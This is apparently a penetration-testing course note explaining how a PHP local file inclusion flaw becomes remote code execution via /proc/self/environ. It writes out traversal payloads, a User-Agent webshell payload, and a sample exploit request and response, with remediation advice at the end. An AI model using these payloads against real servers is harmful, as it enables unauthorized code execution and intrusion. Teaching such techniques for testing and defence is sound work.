---
tags: [vapt, lfi, rce, linux, intermediate]
difficulty: intermediate
module: "23 - Path Traversal and LFI/RFI"
topic: "23.08 LFI to RCE via /proc/self/environ"
---

# 23.08 — LFI to RCE via `/proc/self/environ`

## What is it?
In Linux environments, the `/proc` directory is a virtual filesystem that provides a mechanism for the kernel to send information to processes. Every running process has its own directory inside `/proc/` named after its Process ID (PID). The magic symlink `/proc/self/` always points to the directory of the currently running process (in our case, the PHP/Web Server process).

Inside this directory is a file called `environ`. The `/proc/self/environ` file contains all the environment variables assigned to the current process. Crucially, when a web server (like Apache using mod_php or CGI) spawns a process to handle an HTTP request, it often stores the client's HTTP headers (like `HTTP_USER_AGENT`) as environment variables.

If an application has an LFI vulnerability, an attacker can set their `User-Agent` header to a malicious PHP payload and use the LFI to include `../../../../../../proc/self/environ`. The PHP engine will read the environment variables, find the `HTTP_USER_AGENT` variable containing the PHP code, and execute it, granting Remote Code Execution.

Think of it like sneaking a weapon into a facility by hiding it inside your own ID badge. When the security guard asks to scan your badge (the environment variables), the weapon triggers.

## ASCII Diagram
```text
[Step 1: Send Request with Malicious User-Agent]
[Attacker] ──> GET /index.php?page=../../../../proc/self/environ
               User-Agent: <?php system('id'); ?>
       │
       ▼
[Apache / PHP Process Engine]
       │
       ├─ Spawns process to handle request.
       ├─ Sets Environment Variable: HTTP_USER_AGENT="<?php system('id'); ?>"
       │
[Step 2: LFI Execution]
[Vulnerable PHP Script]
       │
       ├─ include("/proc/self/environ");
       ├─ PHP reads the virtual file from the Linux kernel.
       ├─ Finds the User-Agent variable containing <?php system('id'); ?>
       │
[Execution] ──> Executes the code. RCE Achieved!
```

## How to Find It
- **Manual steps:**
  1. Confirm you have an LFI vulnerability by reading `/etc/passwd`.
  2. Change your LFI payload to point to `/proc/self/environ` (e.g., `?page=../../../../../../proc/self/environ`).
  3. Look at the response. If you see a messy, null-byte separated list of environment variables (like `DOCUMENT_ROOT=/var/www/htmlHTTP_USER_AGENT=Mozilla/5.0...`), the file is readable!
  4. If the file is empty or returns a permission denied error, the server is patched against this specific technique (very common on modern systems).

- **Tool commands with flags explained:**
  Testing `/proc/self/environ` readability using `curl`:
  ```bash
  curl -s "https://target.com/view.php?file=../../../../../../proc/self/environ" --output - | strings
  # We pipe to `strings` because the environ file separates variables with null bytes (\x00),
  # which can break terminal output if printed raw.
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Verify `/proc/self/environ` is readable via LFI.
  2. Intercept the request using Burp Suite or use `curl`.
  3. Modify the `User-Agent` header (or any other HTTP header that gets mapped to an environment variable) to contain your PHP webshell payload.
  4. We recommend using `<?php system($_GET['cmd']); ?>` in the header, and adding `&cmd=whoami` to the URL.
  5. Send the request. The PHP interpreter will include the environment file, execute your payload, and return the output.

- **Actual payloads:**
  **LFI Payload:**
  ```text
  ?page=../../../../../../../../proc/self/environ
  ```
  **Header Poisoning Payload:**
  ```http
  User-Agent: <?php system($_GET['cmd']); ?>
  ```

- **Real HTTP request/response examples:**
  **Exploit Request:**
  ```http
  GET /index.php?page=../../../../../../proc/self/environ&cmd=whoami HTTP/1.1
  Host: target.com
  User-Agent: <?php system($_GET['cmd']); ?>
  ```
  **Exploit Response:**
  ```http
  HTTP/1.1 200 OK
  
  DOCUMENT_ROOT=/var/www/html
  HTTP_USER_AGENT=www-data
  HTTP_HOST=target.com
  ...
  ```
  *(The `www-data` text is the output of the executed `whoami` command, seamlessly taking the place of the User-Agent string!)*

## Real-World Example
In older CTF challenges (and unpatched legacy enterprise servers running CGI/FastCGI), this was a primary vector for LFI to RCE. A penetration tester found an LFI but realized they didn't have read access to `/var/log/apache2/access.log`, defeating log poisoning. They checked `/proc/self/environ` and discovered it was readable by the `www-data` user. They swapped their User-Agent for a PHP reverse shell payload and triggered the LFI, catching the shell on their Netcat listener.

## How to Fix It
- **Developer remediation:**
  The fundamental fix is preventing LFI entirely by using allowlists instead of passing user input to `include()`. 

  On the system side, modern Linux kernels and web servers have largely mitigated this vector. For example, PHP running as an Apache module (mod_php) rarely exposes `HTTP_` variables inside `/proc/self/environ` anymore. Furthermore, modern OS configurations restrict read access to `/proc/<pid>/environ` so that only the exact process owner (and root) can read it, or they block it via AppArmor/SELinux.

- **Code snippet:**
  **Linux System Hardening (Verify Restrictions):**
  ```bash
  # Check if the kernel restricts access to ptrace/proc files
  cat /proc/sys/kernel/yama/ptrace_scope
  # A value of 1 or 2 provides better restriction on /proc file probing
  ```

## Chaining Opportunities
- This vuln + [[09 - LFI to RCE via PHP Session File]] → If `/proc/self/environ` is unreadable or doesn't contain the HTTP headers, pivot to checking PHP Session files (`/var/lib/php/sessions/sess_<id>`) for code execution.
- This vuln + [[Missing File Permissions / Sudo Privileges]] → Like all LFI-to-RCE vectors, immediately check `sudo -l` or search for SUID binaries to escalate to root.

## Related Notes
- [[05 - Local File Inclusion (LFI)]]
- [[07 - LFI to RCE via Log Poisoning]]
- [[09 - LFI to RCE via PHP Session File]]
